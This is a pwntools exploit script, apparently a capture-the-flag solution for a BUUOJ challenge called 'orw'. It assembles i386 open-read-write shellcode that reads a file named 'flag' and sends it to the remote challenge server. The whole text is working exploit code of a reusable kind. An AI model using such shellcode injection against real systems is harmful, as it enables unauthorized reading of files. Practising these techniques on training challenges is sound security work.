from pwn import *

context(os = "linux", arch = "i386", log_level= "debug")
# io = process('orw')
io = remote('node4.buuoj.cn', 29033)

# 5 open(const char *filename, int flags, umode_t mode)
shellcode = asm('push 0x0; push 0x67616c66; mov ebx, esp; xor ecx, ecx; xor edx, edx; mov eax, 0x5; int 0x80')
# 3 read(unsigned int fd, char *buf, size_t count)
shellcode += asm('mov eax, 0x3; mov ecx, ebx; mov ebx, 0x3; mov edx, 0x100; int 0x80')
# 4 write(unsigned int fd, const char *buf, size_t count)
shellcode += asm('mov eax, 0x4; mov ebx, 0x1; int 0x80')

io.sendline(shellcode)
io.interactive()

